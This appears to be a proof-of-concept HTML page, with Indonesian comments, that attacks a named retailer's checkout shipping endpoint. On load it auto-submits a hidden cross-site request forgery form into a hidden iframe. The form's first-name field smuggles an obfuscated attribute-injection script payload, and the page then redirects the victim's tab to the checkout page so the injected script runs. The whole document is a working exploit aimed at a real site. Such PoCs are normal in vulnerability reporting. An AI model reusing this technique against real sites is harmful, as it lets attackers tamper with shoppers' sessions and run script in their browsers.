<!DOCTYPE html>
<html>
<body>
  <form id="csrfForm"
        action="https://ae.loccitane.com/on/demandware.store/Sites-Loccitane_AE-Site/en_AE/CheckoutShippingServices-UpdateShippingMethodsList"
        method="POST"
        target="csrfSink"
        enctype="application/x-www-form-urlencoded">

    <input type="hidden" name="title"     value="Mr">
    <input type="hidden" name="firstName" value='kadalfaiz" pattern="a^" oninvalid="self[%27ale%27%2B%27rt%27]('you+are+hacked')" x="'>
    <input type="hidden" name="lastName"  value="ddfd">
    <input type="hidden" name="address1"  value="dffdfd">
    <input type="hidden" name="address2"  value="Dhaid">
    <input type="hidden" name="city"      value="Dhaid">
    <input type="hidden" name="phone"     value="544334343">
    <input type="hidden" name="phoneCode" value="+971">
    <input type="hidden" name="storeID"   value="">

  </form>

  <!-- iframe tersembunyi sebagai target submit, supaya halaman ini tidak "pindah" ke JSON -->
  <iframe name="csrfSink" style="display:none"></iframe>

  <script>
    (function () {
      const form = document.getElementById('csrfForm');
      const REDIRECT_URL = 'https://ae.loccitane.com/en/checkout?stage=shipping#shipping';

      // 1) Submit form ke iframe tersembunyi (fire-and-forget)
      form.submit();

      // 2) Setelah beberapa saat, arahkan top-level window ke halaman shipping
      //    Delay kecil supaya request POST sempat terkirim & cookie/session ter-update.
      setTimeout(function () {
        // top.location agar redirect terjadi di tab utama, bukan di iframe
        (window.top || window).location.href = REDIRECT_URL;
      }, 1500); // 1.5 detik — bisa disesuaikan (800–2500 ms)
    })();
  </script>
</body>
</html>
